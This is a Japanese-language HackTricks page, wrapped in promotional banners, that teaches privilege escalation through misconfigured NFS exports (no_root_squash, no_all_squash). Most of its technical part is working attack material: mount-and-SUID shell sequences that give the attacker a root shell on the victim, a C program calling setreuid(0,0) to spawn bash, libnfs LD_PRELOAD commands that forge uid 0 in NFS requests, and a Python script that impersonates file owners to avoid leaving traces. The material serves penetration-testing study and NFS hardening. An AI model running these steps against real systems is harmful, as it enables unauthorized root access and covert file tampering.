<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループに参加](https://discord.gg/hRep4RUj7f)**または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦で私をフォローする [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングトリックを共有するためにPRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリに。

</details>


_ **/etc/exports** _ ファイルを読み取り、**no\_root\_squash** として構成されたディレクトリがある場合、それを**クライアントとしてアクセス**し、そのディレクトリ内に**ローカルのrootであるかのように書き込む**ことができます。

**no\_root\_squash**: このオプションは、クライアントのrootユーザーにNFSサーバー上のファイルにアクセスする権限を与えます。これには深刻なセキュリティ上の問題が発生する可能性があります。

**no\_all\_squash:** これは**no\_root\_squash** オプションに類似していますが、**非rootユーザー**に適用されます。例えば、nobodyユーザーとしてシェルを持っているとします。/etc/exportsファイルを確認し、no\_all\_squashオプションが存在することを確認し、/etc/passwdファイルを確認し、非rootユーザーをエミュレートし、そのユーザーとしてsuidファイルを作成します（nfsを使用してマウント）。 nobodyユーザーとしてsuidを実行し、異なるユーザーになります。

# 特権昇格

## リモートエクスプロイト

この脆弱性を見つけた場合、次のように悪用できます：

* クライアントマシンでそのディレクトリを**マウント**し、マウントされたフォルダ内に **/bin/bash** バイナリを**rootとしてコピー**し、それに **SUID権限**を与え、被害者のマシンからそのbashバイナリを実行します。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **クライアントマシンでそのディレクトリをマウント**し、**ルートとして**マウントされたフォルダーに、SUID権限を悪用するコンパイル済みのペイロードをコピーし、それにSUID権限を与え、**被害者のマシンから**そのバイナリを実行します（ここにいくつかの[C SUID payloads](payloads-to-execute.md#c)があります）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## ローカルエクスプロイト

{% hint style="info" %}
自分のマシンから被害者のマシンへのトンネルを作成できる場合、引き続き必要なポートをトンネリングすることで、この特権昇格を悪用するリモートバージョンを使用できます。\
次のトリックは、`/etc/exports` ファイルがIPを示している場合です。この場合、リモートエクスプロイトを使用することはできず、このトリックを悪用する必要があります。\
エクスプロイトが機能するための別の必須要件は、`/etc/export` 内のエクスポートが `insecure` フラグを使用している必要があることです。\
\--_もし `/etc/export` がIPアドレスを示している場合、このトリックが機能するかどうかはわかりません_--
{% endhint %}

## 基本情報

シナリオでは、ローカルマシン上のマウントされたNFS共有を悪用し、NFSv3仕様の欠陥を利用してクライアントがuid/gidを指定できるようにし、不正アクセスを可能にします。エクスプロイトには、NFS RPC呼び出しの偽造を可能にするライブラリである[libnfs](https://github.com/sahlberg/libnfs)を使用します。

### ライブラリのコンパイル

ライブラリのコンパイル手順は、カーネルバージョンに基づいて調整が必要な場合があります。この特定のケースでは、fallocateシステムコールがコメントアウトされていました。コンパイルプロセスには、次のコマンドが含まれます：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 攻撃の実行

攻撃には、特権をrootに昇格させ、シェルを実行する単純なCプログラム（`pwn.c`）を作成することが含まれます。プログラムをコンパイルし、生成されたバイナリ（`a.out`）を、RPC呼び出しでuidを偽装するためにsuid rootで共有に配置します。

1. **攻撃コードをコンパイルする:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **攻撃を共有に配置し、uidを偽装してアクセス権を変更する:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **root権限を取得するために攻撃を実行する:**
```bash
/mnt/share/a.out
#root
```

## ボーナス: ステルスファイルアクセスのためのNFShell
rootアクセスを取得した後、所有権を変更せずにNFS共有とやり取りするために（痕跡を残さないように）、Pythonスクリプト（nfsh.py）が使用されます。このスクリプトは、アクセスされるファイルのuidを調整し、許可の問題なく共有内のファイルとやり取りできるようにします。
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
実行方法:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## 参考文献
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
